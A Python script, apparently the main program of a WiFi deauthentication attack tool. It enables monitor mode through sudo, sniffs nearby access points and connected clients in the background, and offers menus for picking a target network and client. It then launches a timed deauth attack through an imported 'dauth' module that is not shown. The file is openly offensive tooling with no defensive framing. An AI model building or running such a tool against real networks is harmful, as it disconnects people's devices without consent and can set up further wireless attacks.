#!/usr/bin/env python3

import subprocess
import sys
import time
import threading
import network
import data
import dauth

ONE_MINUTE_SCAN = 60

def main():
    # Select interface
    iface = network.select_interface()
    
    # Set up monitor mode
    command = ['sudo', 'bash', './set_up_monitor.sh', iface]
    result = subprocess.run(command, check=True)
    print(f"Set up Monitor Mode for {iface}. Starting continuous sniffing... (data collection runs in background)")
    
    # Start sniffing in background thread
    sniff_thread = threading.Thread(target=network.start_sniff, args=(iface,), daemon=True)
    sniff_thread.start()

    # Initial sniffing warm-up
    warmup = ONE_MINUTE_SCAN
    print(f"Gathering initial data...")
    time.sleep(warmup)

    try:
        while True:
            # Note: sniffing continues while in this menu
            networks = network.get_networks()
            clients = network.get_clients()
            
            data.display_networks(networks, clients)
            choice = input("Enter network index to inspect, 'r' to refresh, 'q' to quit: ").strip().lower()
            
            if choice == 'q':
                break
                
            if choice == 'r':
                refresh = ONE_MINUTE_SCAN
                print(f"Refreshing...")
                time.sleep(refresh)
                continue
                
            if choice.isdigit() and int(choice) < len(networks):
                idx = int(choice)
                target_bssid, info = network.get_network_by_index(idx)
                
                if target_bssid:
                    data.display_selected_ap(info, target_bssid)

                    # Client menu
                    while True:
                        # Still gathering data in background
                        data.display_clients(target_bssid, clients)
                        sub = input("Select client index, 'b' to go back, 'q' to quit: ").strip().lower()
                        
                        if sub == 'q':
                            network.stop_sniffing()
                            sniff_thread.join()
                            sys.exit(0)
                            
                        if sub == 'b':
                            break  # go back to network selection
                            
                        if sub.isdigit() and int(sub) < len(clients[target_bssid]):
                            client_mac, cinfo = network.get_client_by_index(target_bssid, int(sub))
                            
                            if client_mac:
                                data.display_final_selection(info, target_bssid, client_mac, cinfo)
                                
                                # Here you can add deauth attack option
                                attack_choice = input("\nDo you want to perform deauth attack? (y/n): ").strip().lower()
                                if attack_choice == 'y':
                                    duration = input("Enter attack duration in seconds (default 15): ").strip()
                                    duration = int(duration) if duration.isdigit() else 15
                                    
                                    print("\nStarting deauth attack...")
                                    dauth.start_attack(client_mac, target_bssid, iface, duration)
                                    
                                    # Wait for attack to complete or allow stopping
                                    while dauth.is_attack_running():
                                        stop = input("Press 's' to stop attack early, or wait... ").strip().lower()
                                        if stop == 's':
                                            dauth.stop_attack()
                                            break
                                        time.sleep(1)
                                
                                network.stop_sniffing()
                                sniff_thread.join()
                                sys.exit(0)
            else:
                print("Invalid choice.")
                
    except KeyboardInterrupt:
        pass
    finally:
        network.stop_sniffing()
        sniff_thread.join()
        print("\nExiting.")

if __name__ == '__main__':
    main()